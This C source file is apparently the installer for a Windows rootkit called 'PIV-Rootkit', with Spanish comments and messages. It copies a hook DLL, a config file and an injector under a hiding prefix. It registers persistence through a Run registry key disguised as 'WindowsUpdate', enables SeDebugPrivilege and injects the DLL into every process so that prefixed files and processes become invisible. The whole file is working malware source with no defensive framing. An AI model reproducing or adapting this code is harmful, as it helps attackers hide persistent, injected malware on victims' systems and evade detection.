#include "injector.h"
#include "persist.h"
#include <windows.h>
#include <wchar.h>
#include <stdio.h>

#define PERSIST_NAME L"WindowsUpdate"

static int copy_with_prefix(const WCHAR *src, const WCHAR *dstDir,
                            const WCHAR *prefix, const WCHAR *baseName,
                            WCHAR *outPath, DWORD outMax)
{
    swprintf(outPath, outMax, L"%ls\\%ls%ls", dstDir, prefix, baseName);
    if (!CopyFileW(src, outPath, FALSE)) {
        wprintf(L"[!] No se pudo copiar %ls -> %ls (error %lu)\n",
                src, outPath, GetLastError());
        return -1;
    }
    wprintf(L"[+] Copiado: %ls\n", outPath);
    return 0;
}

int wmain(int argc, WCHAR *argv[])
{
    WCHAR installDir[MAX_PATH];
    GetModuleFileNameW(NULL, installDir, MAX_PATH);
    WCHAR *slash = wcsrchr(installDir, L'\\');
    if (slash) *slash = L'\0';

    WCHAR prefix[64] = L"$rk";
    if (argc >= 2) wcscpy(prefix, argv[1]);

    wprintf(L"=== PIV-Rootkit Installer ===\n");
    wprintf(L"Directorio: %ls\n", installDir);
    wprintf(L"Prefijo:    %ls\n\n", prefix);

    /* Rutas de origen (misma carpeta que install.exe) */
    WCHAR srcDll[MAX_PATH], srcCfg[MAX_PATH];
    swprintf(srcDll, MAX_PATH, L"%ls\\hook.dll", installDir);
    swprintf(srcCfg, MAX_PATH, L"%ls\\config.txt", installDir);

    /* 1. Copiar ficheros con prefijo para auto-ocultacion */
    wprintf(L"[1] Copiando ficheros con prefijo...\n");
    WCHAR dstDll[MAX_PATH], dstCfg[MAX_PATH];
    copy_with_prefix(srcDll, installDir, prefix, L"hook.dll", dstDll, MAX_PATH);
    copy_with_prefix(srcCfg, installDir, prefix, L"config.txt", dstCfg, MAX_PATH);

    /* 2. Persistencia: clave Run apuntando al propio install con -inject */
    wprintf(L"\n[2] Instalando persistencia (HKCU\\...\\Run\\%ls)...\n", PERSIST_NAME);
    WCHAR myself[MAX_PATH];
    GetModuleFileNameW(NULL, myself, MAX_PATH);

    /* La clave Run ejecuta el inyector con la DLL oculta */
    WCHAR cmdLine[MAX_PATH * 2];
    WCHAR injPath[MAX_PATH];
    swprintf(injPath, MAX_PATH, L"%ls\\%lsinjector.exe", installDir, prefix);
    swprintf(cmdLine, MAX_PATH * 2, L"\"%ls\" \"%ls\"", injPath, dstDll);

    if (persist_install(PERSIST_NAME, cmdLine) == 0)
        wprintf(L"[+] Clave Run instalada: %ls\n", cmdLine);
    else
        wprintf(L"[!] Error al instalar la clave Run\n");

    /* 3. Copiar injector.exe con prefijo */
    wprintf(L"\n[3] Copiando inyector con prefijo...\n");
    WCHAR srcInj[MAX_PATH];
    swprintf(srcInj, MAX_PATH, L"%ls\\injector.exe", installDir);
    copy_with_prefix(srcInj, installDir, prefix, L"injector.exe", injPath, MAX_PATH);

    /* 4. Inyectar ahora */
    wprintf(L"\n[4] Activando SeDebugPrivilege...\n");
    if (enable_debug_privilege() == 0)
        wprintf(L"[+] SeDebugPrivilege activado\n");
    else
        wprintf(L"[!] No se pudo activar SeDebugPrivilege\n");

    wprintf(L"\n[5] Inyectando %ls en todos los procesos...\n", dstDll);
    int count = inject_all(dstDll);
    wprintf(L"\n[+] Inyectado en %d proceso(s)\n", count);

    wprintf(L"\n=== Instalacion completada ===\n");
    wprintf(L"Procesos y ficheros con prefijo '%ls' ahora son invisibles\n", prefix);
    wprintf(L"Persistencia: se reinyecta al iniciar sesion\n");

    return 0;
}
